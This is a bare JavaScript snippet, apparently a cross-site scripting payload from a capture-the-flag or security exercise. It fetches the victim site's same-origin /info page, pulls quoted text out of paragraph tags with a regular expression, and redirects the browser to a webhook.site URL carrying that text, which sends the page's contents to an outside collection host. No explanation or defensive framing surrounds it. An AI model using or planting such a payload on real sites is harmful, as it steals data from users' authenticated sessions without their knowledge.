var x = null;
//console.log(document.URL);
console.log(window.location.href);
let infoURL = 'http://' + window.location.host + '/info';
fetch(infoURL).then(function (response) {
    return response.text();
}).then(function (html) {
    x = html;
    console.log(html);
    let re = /<p>"(.*)"<\/p>/gm;
    let m = x.match(re);
    console.log(m);
    window.location = 'https://webhook.site/f54b91c0-7b15-4dfb-a009-d72c7fd9b9e3?html=' + encodeURIComponent(m);
}).catch(function (err) {
    // There was an error
    console.warn('Something went wrong.', err);
});